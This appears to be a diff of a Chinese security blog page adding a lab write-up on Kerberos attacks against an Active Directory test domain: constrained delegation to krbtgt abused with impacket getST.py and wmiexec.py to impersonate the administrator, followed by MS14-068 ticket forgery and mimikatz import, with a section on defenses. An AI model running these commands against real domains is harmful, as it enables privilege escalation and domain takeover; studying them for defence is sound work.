+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">192.168.200.146 0day.org</span><br><span class="line">192.168.200.146 OWA2010SP3</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12576598/1614517745358-3b763582-4fd6-4584-b2a6-b79f270d34e2.png" alt="img"></p>
+<p>创建域用户test然后赋予SPN</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12576598/1614520111048-505d1b26-4603-4f74-8095-0f6038ba8eec.png" alt="img"></p>
+<p>然后在域控上配置test用户到krbtgt用户的约束性委派。 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Import-Module ActiveDirectory</span><br><span class="line">$user = Get-ADUser test -Properties &quot;msDS-AllowedToDelegateTo&quot;</span><br><span class="line">Set-ADObject $user -Add @&#123; &quot;msDS-AllowedToDelegateTo&quot; = @(&quot;krbtgt/0day.org&quot;) &#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12576598/1614517156400-84eefceb-019a-452e-a71c-27b3db347c9e.png" alt="img"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12576598/1614520190944-1abedb72-d9e5-4e49-9614-0e93a43981b5.png" alt="img"></p>
+<p>可以看到test账户具有委派性</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12576598/1614520228248-67e67a44-4558-4cdb-80ed-25cffd5b8c49.png" alt="img"></p>
+<p>然后在kali上攻击</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 getST.py -dc-ip 192.168.200.146 -spn krbtgt/0day.org -impersonate administrator 0day.org/test:Yicunyiye123</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12576598/1614520252698-868e2e27-c72c-4d81-b452-168979bcf873.png" alt="img"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export KRB5CCNAME=administrator.ccache</span><br><span class="line">python3 wmiexec.py -no-pass -k administrator@OWA2010SP3 -dc-ip 192.168.200.146</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12576598/1614520338457-fb3c3090-1809-41fa-9693-a869a517681d.png" alt="img"></p>
+<h2 id="域委派的防御措施"><a href="#域委派的防御措施" class="headerlink" title="域委派的防御措施"></a>域委派的防御措施</h2><p>因为委派比较实用我们也不能说直接简单粗暴关闭该功能。</p>
+<p>1.高权限用户可以设置不能被委派</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12576598/1614520453951-3104245f-ce7b-4355-9be7-5a6ba68cbbf5.png" alt="img"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12576598/1614520653095-debaa327-1cbb-4498-a205-d1707766fbf6.png" alt="img"></p>
+<p>可以看到administrator是无法成功的，但是sqladmin可以</p>
+<p>2.Windows 2012 R2及更高的系统建立了受保护的用户组，组内用户不允许被委派，这是有效的手段。受保护的用户组，当这个组内的用户登录时（windows 2012 R2域服务器，客户端必须为Windows 8.1或之上），不能使用NTLM认证；适用于<code>Windows Server 2016</code>，<code>Windows Server 2012 R2</code>、 <code>Windows Server 2012</code></p>
+<p>3.一般TGT 4小时后失效</p>
+<p>4.Kerberos预认证时不使用DES或者RC4等加密算法；</p>
+<h1 id="PAC"><a href="#PAC" class="headerlink" title="PAC"></a>PAC</h1><p>具体查看：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/192810#h2-1">Windows内网协议学习Kerberos篇之PAC</a></p>
+<p>kerberos的流程：</p>
+<p>1.用户向KDC发起AS_REQ,请求凭据是用户hash加密的时间戳，KDC使用用户hash进行解密，如果结果正确返回用krbtgt hash加密的TGT票据</p>
+<p>2.用户凭借TGT票据向KDC发起针对特定服务的TGS_REQ请求，KDC使用krbtgt hash进行解密，如果结果正确，就返回用服务hash 加密的TGS票据</p>
+<p>3.用户拿着TGS票据去请求服务，服务使用自己的hash解密TGS票据。如果解密正确，就允许用户访问。</p>
+<p>上面这个流程看起来没错，却忽略一个最重要的因素，那就是用户有没有权限访问该服务，在上面的流程里面，只要用户的hash正确，那么就可以拿到TGT，有了TGT，就可以拿到TGS，有了TGS，就可以访问服务，任何一个用户都可以访问任何服务。也就是说上面的流程解决了”Who am i?”的问题，并没有解决 “What can I do?”的问题。</p>
+<p>在Kerberos最初设计的流程里说明了如何证明客户端的真实身份，但是并没有说明客户端是否有权限访问该服务，因为在域中不同权限的用户能够访问的资源是不同的。所以微软为了解决权限这个问题，引入了 PAC (Privilege Attribute Certificate，特权属性证书) 的概念。</p>
+<h2 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h2><p>MS14-068编号CVE-2014-6324，补丁为3011780，如果自检可在域控制器上使用命令检测。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo |find &quot;3011780&quot;</span><br></pre></td></tr></table></figure>
+
+<p>为空说明该服务器存在MS14-068漏洞</p>
+<p>环境：</p>
+<p>域机器：PC-JACK-0DAY，win7，知道一个域用户和密码：jack\0day，admin!@#45，拥有该机器的管理员权限</p>
+<p>域控：OWA2010SP3，ip:192.168.3.142</p>
+<p><strong>1.生成票据</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MS14-068.exe -u jack@0day.org -p admin!@#45 -s S-1-5-21-1812960810-2335050734-3517558805-1133 -d 192.168.3.142  </span><br><span class="line">#MS14-068.exe -u 域用户@0day.org -p 域用户jack密码 -s 域用户jack的SID -d 域控ip</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12576598/1614522805982-faf2b675-2324-4512-bae9-a9dae96afe20.png" alt="img"></p>
+<p>可以看到生成了<a href="mailto:&#84;&#71;&#84;&#x5f;&#106;&#x61;&#99;&#107;&#x40;&#x30;&#100;&#97;&#121;&#46;&#111;&#114;&#x67;&#46;&#x63;&#99;&#97;&#x63;&#x68;&#101;">&#84;&#71;&#84;&#x5f;&#106;&#x61;&#99;&#107;&#x40;&#x30;&#100;&#97;&#121;&#46;&#111;&#114;&#x67;&#46;&#x63;&#99;&#97;&#x63;&#x68;&#101;</a></p>
+<p><strong>2.mimikatz导入票据</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptc 票据路径</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12576598/1614522859509-84936377-0fae-456e-b7df-ed9c55fe80c2.png" alt="img"></p>
+<p><strong>3.访问域控</strong></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12576598/1614522925180-c7834f4e-387e-42e7-8367-4635318b3fd4.png" alt="img"></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://example.com/2021/10/02/csharp%E6%93%8D%E4%BD%9Cldap/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -601,7 +1248,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-count">2</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
